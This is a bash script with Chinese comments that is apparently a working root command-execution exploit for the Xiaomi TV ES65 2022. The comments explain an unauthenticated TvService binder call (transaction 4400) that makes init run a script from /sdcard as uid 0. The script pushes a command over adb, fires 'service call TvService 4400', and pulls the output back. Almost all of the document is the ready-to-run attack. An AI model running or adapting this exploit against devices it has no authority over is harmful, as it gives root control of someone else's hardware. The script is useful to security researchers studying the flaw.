#!/bin/bash
# ============================================================
# 小米电视 ES65 2022 (baymax) —— uid 0 命令执行器
#
# 原理: TvService 的 binder transact(4400) 无任何调用方鉴权,
#       会把传入的 (code, arguments) 直接写进
#       vendor.misysdiagnose.cmd.code / .cmd.arguments,
#       触发 /init.mitv.rc 里的:
#         on property:vendor.misysdiagnose.cmd.code=*
#           exec - root root -- /vendor/bin/misysdiagnose -{code} {arguments}
#       => init 以 uid 0 执行我们放在 /sdcard 的 shell 脚本。
#
# 用法:  ./tv_root_exec.sh "id; ls /data/system"
# 注意:  脚本在 u:r:misysdiagnose:s0 域运行, DAC 全通(uid0+cap全部),
#        但 SELinux 仍限制: 不能改 /system、不能 insmod、不能关 SELinux、
#        不能 binder 到 system_server(pm/am/settings 失效)、无 net_admin。
#        命令输出必须自己重定向到 /sdcard, 否则拿不到。
# ============================================================
A=/d/Tools/platform-tools/adb.exe
D=192.168.1.164:5555
WRK="D:/Work/WorkBuddy/.tools/tv"

if [ -z "$1" ]; then
    echo "用法: $0 '<要执行的命令>'"
    exit 1
fi

# 1. 生成远端脚本(强制补 PATH, 并把输出落到 /sdcard)
{
  echo 'export PATH=/system/bin:/vendor/bin:/system/xbin:$PATH'
  echo '{'
  echo "$1"
  echo '} > /sdcard/cmd_out.txt 2>&1'
} > "$WRK/cmd.sh"

# 2. 推送并触发
"$A" -s "$D" push "$WRK/cmd.sh" /sdcard/cmd.sh >/dev/null 2>&1
"$A" -s "$D" shell 'rm -f /sdcard/cmd_out.txt; service call TvService 4400 s16 "s" s16 "/sdcard/cmd.sh"' 2>&1 | tr -d '\r' | grep -v "Init wrapper"
sleep 3

# 3. 取回结果
"$A" -s "$D" pull /sdcard/cmd_out.txt "$WRK/cmd_out.txt" >/dev/null 2>&1
echo "================= uid 0 执行结果 ================="
cat "$WRK/cmd_out.txt" 2>&1 | tr -d '\000'
